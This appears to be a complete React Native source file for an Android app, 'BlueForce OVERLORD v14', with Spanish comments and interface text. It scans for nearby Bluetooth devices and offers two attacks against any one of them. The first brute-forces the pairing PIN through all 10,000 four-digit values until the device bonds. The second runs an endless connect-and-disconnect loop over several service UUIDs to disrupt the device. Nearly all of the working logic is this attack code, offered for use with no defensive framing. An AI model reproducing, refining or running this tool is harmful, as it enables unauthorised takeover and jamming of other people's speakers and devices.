import React, { useState, useEffect } from 'react';
import { StyleSheet, Text, View, TouchableOpacity, ScrollView, Alert, PermissionsAndroid, Platform, FlatList, ActivityIndicator, Modal, TextInput } from 'react-native';
import RNBluetoothClassic from 'react-native-bluetooth-classic';

// UUIDS TÁCTICOS PARA ENGAÑAR A PARLANTES MODERNOS
const TACTICAL_UUIDS = [
  "00001101-0000-1000-8000-00805f9b34fb", // Serial Port
  "0000110b-0000-1000-8000-00805f9b34fb", // A2DP Audio
  "0000110e-0000-1000-8000-00805f9b34fb", // AVRCP Control
  "0000111e-0000-1000-8000-00805f9b34fb", // Handsfree
];

export default function App() {
  const [discoveredDevices, setDiscoveredDevices] = useState([]);
  const [history, setHistory] = useState({});
  const [aliases, setAliases] = useState({});
  const [mode, setMode] = useState('IDLE');
  const [currentPin, setCurrentPin] = useState('READY');
  const [disruptCount, setDisruptCount] = useState(0);
  const [isScanning, setIsScanning] = useState(false);
  const [logs, setLogs] = useState([]);

  const addLog = (msg) => setLogs(p => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...p].slice(0, 50));

  useEffect(() => {
    (async () => {
      if (Platform.OS === 'android') {
        await PermissionsAndroid.requestMultiple([
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_ADVERTISE
        ]);
        addLog("👑 OVERLORD V14 ARMADO.");
      }
    })();
  }, []);

  const scan = async () => {
    if (isScanning || mode !== 'IDLE') return;
    setIsScanning(true); addLog("🔍 Escaneando frecuencias...");
    try {
      const devices = await RNBluetoothClassic.startDiscovery();
      setDiscoveredDevices(devices.sort((a,b) => b.rssi - a.rssi));
    } catch (e) { addLog("❌ Error de comunicación."); }
    finally { setIsScanning(false); }
  };

  const startBruteForce = async (device) => {
    setMode('BRUTE'); addLog(`🚀 ATAQUE PIN contra ${device.address}`);
    await RNBluetoothClassic.cancelDiscovery(); 
    for (let i = 0; i <= 9999; i++) {
        let m; setMode(c => { m = c; return c; }); if (m !== 'BRUTE') break;
        const pin = i.toString().padStart(4, '0');
        setCurrentPin(pin);
        try {
            await Promise.race([ RNBluetoothClassic.pairDevice(device.address, { pin }), new Promise(r => setTimeout(r, 1200)) ]);
            const bonded = await RNBluetoothClassic.getBondedDevices();
            if (bonded.some(d => d.address === device.address)) {
                setHistory(p => ({ ...p, [device.address]: { status: '🔓 CONQUISTADO', pin } }));
                setMode('IDLE'); Alert.alert("ÉXITO", "DISPOSITIVO CONQUISTADO: " + pin); return;
            }
            if (i > 0 && i % 10 === 0) await new Promise(r => setTimeout(r, 2000));
        } catch (e) { await new Promise(r => setTimeout(r, 400)); }
    }
    setMode('IDLE');
  };

  const startDisruptor = async (device) => {
    setMode('DISRUPT'); setDisruptCount(0);
    addLog(`🔥 BOMBARDEO MULTIVECTOR: ${device.address}`);
    await RNBluetoothClassic.cancelDiscovery();
    let count = 0;
    while (true) {
        let m; setMode(c => { m = c; return c; }); if (m !== 'DISRUPT') break;
        count++; setDisruptCount(count);
        try {
            // ATAQUE MULTIVECTOR DE SERVICIOS
            const uuid = TACTICAL_UUIDS[count % TACTICAL_UUIDS.length];
            await Promise.race([
                RNBluetoothClassic.connectDevice(device.address, { connectorType: "rfcomm", UUID: uuid }),
                new Promise(r => setTimeout(r, 600))
            ]);
            await RNBluetoothClassic.disconnectDevice(device.address);
        } catch (e) {}
        if (count % 20 === 0) addLog(`⚡ Inyección #${count} exitosa.`);
    }
    setMode('IDLE');
  };

  return (
    <View style={styles.container}>
      <Text style={styles.title}>BlueForce OVERLORD v14</Text>
      <View style={[styles.panel, mode === 'DISRUPT' && { borderColor: '#ff0033', borderWidth: 2 }]}>
        <Text style={styles.st}>MODO: {mode}</Text>
        <Text style={styles.pinText}>{mode === 'BRUTE' ? currentPin : mode === 'DISRUPT' ? `VECTORS: ${disruptCount}` : 'READY'}</Text>
        <TouchableOpacity style={styles.scanBtn} onPress={scan} disabled={mode !== 'IDLE'}>
          {isScanning ? <ActivityIndicator color="#000" /> : <Text style={styles.scanText}>ESCANEO DE LARGO ALCANCE</Text>}
        </TouchableOpacity>
      </View>
      <FlatList data={discoveredDevices} renderItem={({ item }) => {
        const h = history[item.address] || { status: '⚪ NUEVO' };
        const name = aliases[item.address] || item.name || "N/A";
        const isC = h.status.includes('🔓');
        return (
          <View style={styles.card}>
            <View style={{ flex: 1, marginLeft: 10 }}>
              <Text style={styles.name}>{name}</Text>
              <Text style={styles.mac}>{item.address} | {item.rssi} dBm</Text>
              <Text style={[styles.hist, {color: isC ? '#00f2ff' : '#666'}]}>{h.status}</Text>
            </View>
            <View style={{ flexDirection: 'row' }}>
              <TouchableOpacity style={styles.btn} onPress={() => startBruteForce(item)} disabled={mode !== 'IDLE'}><Text style={styles.btT}>PIN</Text></TouchableOpacity>
              <TouchableOpacity style={[styles.btn, {backgroundColor:'#ff0033', marginLeft:5}]} onPress={() => startDisruptor(item)} disabled={mode !== 'IDLE'}><Text style={styles.btT}>!BUG</Text></TouchableOpacity>
            </View>
          </View>
        );
      }} />
      <ScrollView style={styles.logs}>{logs.map((l, i) => <Text key={i} style={styles.lt}>{l}</Text>)}</ScrollView>
      {mode !== 'IDLE' && <TouchableOpacity style={styles.stop} onPress={()=>setMode('IDLE')}><Text style={styles.stopT}>ABORTAR MISIÓN</Text></TouchableOpacity>}
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#000', padding: 20, paddingTop: 40 },
  title: { color: '#00f2ff', fontSize: 18, fontWeight: 'bold', textAlign: 'center', marginBottom: 20 },
  panel: { backgroundColor: '#0a0d14', padding: 25, borderRadius: 20, marginBottom: 15, borderWith: 1, borderColor: '#1a1f2e' },
  st: { color: '#444', fontSize: 10, textAlign: 'center', letterSpacing: 2 },
  pinText: { color: '#fff', fontSize: 50, fontWeight: 'bold', textAlign: 'center', marginBottom: 15, textShadowColor: '#00f2ff', textShadowRadius: 10 },
  scanBtn: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 12, alignItems: 'center' },
  scanText: { color: '#000', fontWeight: 'bold', fontSize: 15 },
  card: { backgroundColor: '#11151f', padding: 15, borderRadius: 15, marginBottom: 10, flexDirection: 'row', alignItems: 'center' },
  name: { color: '#fff', fontWeight: 'bold', fontSize: 12 },
  mac: { color: '#444', fontSize: 8 },
  hist: { fontSize: 8, fontWeight: 'bold', marginTop: 4 },
  btn: { backgroundColor: '#1a1f2e', padding: 12, borderRadius: 10 },
  btT: { color: '#fff', fontSize: 10, fontWeight: 'bold' },
  logs: { height: 90, backgroundColor: '#000', padding: 10, borderRadius: 10, borderLeftWidth: 2, borderLeftColor: '#333' },
  lt: { color: '#333', fontSize: 8, marginBottom: 2 },
  stop: { backgroundColor: '#ff0033', padding: 18, borderRadius: 15, alignItems: 'center', marginTop: 10 },
  stopT: { color: '#fff', fontWeight: 'bold' }
});
